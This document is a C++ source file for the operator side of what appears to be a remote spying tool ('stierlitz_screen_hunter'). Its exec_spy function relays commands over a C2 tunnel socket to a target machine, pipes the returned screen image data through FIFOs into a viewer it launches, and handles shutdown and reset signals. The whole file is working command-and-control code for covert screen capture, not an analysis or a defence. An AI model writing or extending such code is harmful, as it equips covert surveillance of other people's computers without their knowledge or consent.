#include "screen_hunter.hpp"

void ScreenHunter::exec_spy() {
    int rc = accept_tunnel_end();
    
    if (rc < 0) {
        return;
    }

    fifo_data_ = fifo_path_ + (std::string) "_data";
    fifo_data_in_ = fifo_data_ + (std::string) "_in";
    fifo_in_ = fifo_path_ + (std::string) "_in";

    int tries = 0;
    while ((tunnel_fifo_data_ = open(fifo_data_.c_str(), O_WRONLY | O_NONBLOCK)) == -1 && tries++ < 20) {
        std::cout << YELLOW << "[SpyTunnel::run] Waiting for FIFO file to be created..." << RESET;
        std::this_thread::sleep_for(std::chrono::milliseconds(200));
    }

    if (tunnel_fifo_data_ == -1) {
        std::cerr << RED << "[SpyTunnel::run] Error opening data FIFO file: " << fifo_data_ << RESET;
        close_fifos();
        return;
    }

    tunnel_fifo_in_ = open(fifo_in_.c_str(), O_RDONLY | O_NONBLOCK);
    if (tunnel_fifo_in_ < 0) {
        write_fifo_error("Error while opening the fifo path");
        close_fifos();
        return;
    }

    tunnel_fifo_data_in_ = open(fifo_data_in_.c_str(), O_RDONLY | O_NONBLOCK);
    if (tunnel_fifo_data_in_ < 0) {
        write_fifo_error("Error while opening the fifo path");
        close_fifos();
        return;
    }
    

    ScopedEpollFD epoll_fd;
    rc = create_epoll_fd(epoll_fd);
    if (rc < 0) {
        write_fifo_error("[SpyTunnel::run] Error creating epoll_fd" + std::string(strerror(errno)));
        close_fifos();
        return;
    }

    struct epoll_event screen_hunter_c2_event;
    screen_hunter_c2_event.data.fd = tunnel_fifo_in_;
    screen_hunter_c2_event.events = EPOLLIN;
    if (epoll_ctl(epoll_fd.fd, EPOLL_CTL_ADD, tunnel_fifo_in_, &screen_hunter_c2_event) < 0) {
        write_fifo_error("[SpyTunnel::run] Error adding screen hunter c2 event" + std::string(strerror(errno)));
        return;
    }

    struct epoll_event screen_hunter_tunnel_end_event;
    screen_hunter_tunnel_end_event.data.fd = tunnel_end_socket_;
    screen_hunter_tunnel_end_event.events = EPOLLIN;
    if (epoll_ctl(epoll_fd.fd, EPOLL_CTL_ADD, tunnel_end_socket_, &screen_hunter_tunnel_end_event) < 0) {
        std::cout << MAGENTA << "tunnel_end_socket_=" << tunnel_end_socket_ << std::endl;
        write_fifo_error("[SpyTunnel::run] Error adding tunnel_end_socket_ to epoll" + std::string(strerror(errno)));
        return;
    }

    char command[1024] = {0};
    char buffer[BUFFER_SIZE] = {0};

    struct epoll_event events[3];
    while (true) {
        int nfds = epoll_wait(epoll_fd.fd, events, 3, -1);
        if (nfds < 0) {
            return;
        }

        for (int i=0;i<nfds;i++) {
            if (events[i].data.fd == tunnel_shutdown_fd_.fd) {
                // Server shuts down
                uint64_t u;
                read(tunnel_shutdown_fd_.fd, &u, sizeof(u));
                if (tunnel_fifo_ != -1) {
                    write(tunnel_fifo_, RESET_C2_FIFO, strlen(RESET_C2_FIFO));
                    close_fifos();
                }
                return;
            } else if (events[i].data.fd == tunnel_fifo_in_) {
                // Command from screen hunter. Forward the command to the tunnel_socket_
                std::cout << MAGENTA << "Data received from tunnel_fifo_in_" << RESET << std::endl;
                rc = read(tunnel_fifo_in_, command, sizeof(command));
                if (rc <= 0) {
                    std::cout << MAGENTA << "Failed to read from tunnel_fifo_in_" << RESET << std::endl;
                    write_fifo_error("[SpyTunnel::run] Was unable to read command from tunnel_fifo_in_");
                    close(tunnel_fifo_in_);
                    return;
                } 

                rc = send(tunnel_end_socket_, command, rc, 0);
                if (rc <= 0) {
                    std::cout << MAGENTA << "Failed to send the command" << RESET << std::endl;
                    write_fifo_error("[SpyTunnel::run] Was unable to receive buffer from tunnel_end_socket_");
                    close_fifos();
                    return;
                }

                if (strncmp(command, "exit", 4) == 0) {
                    close_fifos();                    
                    return;
                } 
            } else if (events[i].data.fd == tunnel_end_socket_) {
                // Data from the target. Forward it to correct fifo
                std::cout << MAGENTA << "Data received from tunnel_end_socket_" << RESET;
                
                int bytes_received = recv(tunnel_end_socket_, buffer, BUFFER_SIZE, 0);
                if (bytes_received <= 0) {
                    std::cout << MAGENTA << "Failed to receive from tunnel_end_socket_" << RESET;
                    write_fifo_error("[SpyTunnel::run] Was unable to receive buffer from tunnel_end_socket_");
                    close_fifos();
                    return;
                }

                if (bytes_received >= END_KEY_LEN && memcmp(buffer + (bytes_received - RES_UPDATE_KEY_LEN), RES_UPDATE_KEY, RES_UPDATE_KEY_LEN) == 0) {
                    rc = write(tunnel_fifo_, buffer, bytes_received);
                    if (rc <= 0) {
                        write_fifo_error("[SpyTunnel::run] Was unable to write buffer to tunnel_fifo_");
                        close_fifos();
                        return;
                    }
                    continue;
                }

                // Data needs to be forwarded to data fifo until screen_hunter_terminal terminates it

                ScopedEpollFD inner_epoll_fd;
                inner_epoll_fd.fd = epoll_create1(0);
                if (inner_epoll_fd.fd == -1) {
                    write_fifo_error("Error creating inner_epoll_fd");
                    close_fifos();
                    return;
                }

                struct epoll_event inner_shutdown_event;
                inner_shutdown_event.data.fd = tunnel_shutdown_fd_.fd;
                inner_shutdown_event.events = EPOLLIN;
                if (epoll_ctl(inner_epoll_fd.fd, EPOLL_CTL_ADD, tunnel_shutdown_fd_.fd, &inner_shutdown_event) < 0) {
                    write_fifo_error("Error when adding EPOLL_CTL_ADD");
                    close_fifos();
                    return;
                }

                struct epoll_event inner_data_event;
                inner_data_event.data.fd = tunnel_end_socket_;
                inner_data_event.events = EPOLLIN;
                if (epoll_ctl(inner_epoll_fd.fd, EPOLL_CTL_ADD, tunnel_end_socket_, &inner_data_event) < 0) {
                    write_fifo_error("Error when adding EPOLL_CTL_ADD");
                    close_fifos();
                    return;
                } 

                uint16_t c = 1;
                fd_set creads;

                while (c) {
                    rc = write(tunnel_fifo_data_, buffer, bytes_received);
                    if (rc <= 0) {
                        write_fifo_error("Was unable to write buffer to tunnel_fifo_data_ " + (std::string) strerror(errno));
                        close_fifos();
                        return;
                    }

                    FD_ZERO(&creads);
                    FD_SET(tunnel_fifo_data_in_, &creads);
                    
                    struct timeval tv;
                    tv.tv_sec = 3;
                    tv.tv_usec = 0;
                    
                    rc = select(tunnel_fifo_data_in_ + 1, &creads, nullptr, nullptr, &tv);
                    if (rc <= 0) {
                        // Error or timeout
                        std::cout << MAGENTA << "Failed to select on creads" << RESET << std::endl;
                        write_fifo_error("[SpyTunnel::run] Was unable to receive 'continue' byte from tunnel_fifo_data_in_");
                        close_fifos();
                        break;
                    }

                    rc = read(tunnel_fifo_data_in_, &c, sizeof(c));
                    if (rc <= 0) {
                        write_fifo_error("[SpyTunnel::run] Was unable to receive continue" + (std::string) strerror(errno));
                        close_fifos();
                        break;
                    }
                    std::cout << MAGENTA << "c received: " << c << RESET;

                    if (c == 0) {
                        // Receive no more
                        break;
                    }

                    // Keep receiving
                    struct epoll_event inner_events[2];
                    int inner_nfds = epoll_wait(inner_epoll_fd.fd, inner_events, 2, -1);
                    if (inner_nfds < 0) {
                        return;
                    }

                    for (int j = 0; j < inner_nfds; j++) {
                        if (inner_events[j].data.fd == tunnel_shutdown_fd_.fd) {
                            uint64_t u;
                            read(tunnel_shutdown_fd_.fd, &u, sizeof(u));
                            if (tunnel_fifo_ != -1) {
                                write(tunnel_fifo_, RESET_C2_FIFO, strlen(RESET_C2_FIFO));
                                close_fifos();
                            }
                            return;
                        } else if (inner_events[j].data.fd == tunnel_end_socket_) {
                            // Rest of the RGB data
                            bytes_received = recv(tunnel_end_socket_, buffer, BUFFER_SIZE, 0);
                            if (bytes_received <= 0) {
                                std::cout << MAGENTA << "Failed to receive from tunnel_end_socket_" << RESET << std::endl;
                                write_fifo_error("[SpyTunnel::run] Was unable to receive buffer from tunnel_end_socket_");
                                close_fifos();
                                return;
                            }
                            std::cout << MAGENTA << "Additional received: " << bytes_received << std::endl;
                        }
                    }
                }

                epoll_ctl(inner_epoll_fd.fd, EPOLL_CTL_DEL, tunnel_shutdown_fd_.fd, &inner_shutdown_event);
                epoll_ctl(inner_epoll_fd.fd, EPOLL_CTL_DEL, tunnel_end_socket_, &inner_data_event);
            }
        }
    }
}
void ScreenHunter::spawn_window() {
    std::string end_key_len_str = std::to_string(END_KEY_LEN);
    std::string res_update_key_len_str = std::to_string(RES_UPDATE_KEY_LEN);

    execlp(
        "urxvt", "urxvt", "-hold", "-name", "stierlitz_screen_hunter", 
        "-e", SCREEN_HUNTER_SCRIPT_PATH, 
        fifo_path_.c_str(), 
        END_KEY, end_key_len_str.c_str(), 
        RES_UPDATE_KEY, res_update_key_len_str.c_str(),
        (char*)NULL
    );
}

void ScreenHunter::close_fifos() {
    if (tunnel_fifo_ != -1) {
        close(tunnel_fifo_);
    }

    if (tunnel_fifo_in_ != -1) {
        close(tunnel_fifo_in_);
    }

    if (tunnel_fifo_data_ != -1) {
        close(tunnel_fifo_data_);
    }
    if (tunnel_fifo_data_in_ != -1) {
        close(tunnel_fifo_data_in_);
    }
    std::cout << MAGENTA << "Closed fifos" << RESET;
}